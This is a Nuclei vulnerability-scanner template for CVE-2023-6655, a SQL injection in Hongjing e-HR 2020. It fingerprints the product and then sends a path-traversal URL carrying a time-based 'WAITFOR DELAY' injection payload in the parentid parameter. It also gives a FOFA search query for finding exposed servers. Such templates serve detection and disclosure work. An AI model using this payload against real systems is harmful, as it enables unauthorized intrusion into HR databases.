id: CVE-2023-6655

info:
  name: Hongjing e-HR 2020 - SQL Injection
  author: pussycat0x
  severity: high
  description: |
    A vulnerability, which was classified as critical, has been found in Hongjing e-HR 2020. Affected by this issue is some unknown functionality of the file /w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree of the component Login Interface. The manipulation of the argument parentid leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. VDB-247358 is the identifier assigned to this vulnerability.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-6655
    - https://github.com/Gent5698/vulnerability/blob/main/%E5%AE%8F%E6%99%AF/CVE-2023-6655/README.md
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 7.3
    cve-id: CVE-2023-6655
    cwe-id: CWE-89
    epss-score: 0.00135
    epss-percentile: 0.34011
    cpe: cpe:2.3:a:hrp2000:e-hr:2020:*:*:*:*:*:*:*
  metadata:
    verified: true
    vendor: hrp2000
    product: e-hr
    fofa-query: title="人力资源信息管理系统"
  tags: cve,cve2023,hjsoft,management-system,sqli,vkev

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    host-redirects: true
    max-redirects: 2

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(body, '/hcm/themes/')"
        condition: and
        internal: true

  - raw:
      - |
        GET /w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree?isroot=child&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A6%27--&kind=2&catalog_id=11&issuperuser=111&manageprive=111&action=111&target= HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate

    matchers:
      - type: dsl
        dsl:
          - "duration >= 6"
# digest: 4b0a004830460221008b7614e1f2a5cebaf34fc17f201f23c542cf0bf3ffba9208cec7593d0ae8136d022100cc15dcb13983bd7178b3737d316b0a0e29067087a63743854cd2b425c39e0e2d:922c64590222798bb761d5b6d8e72950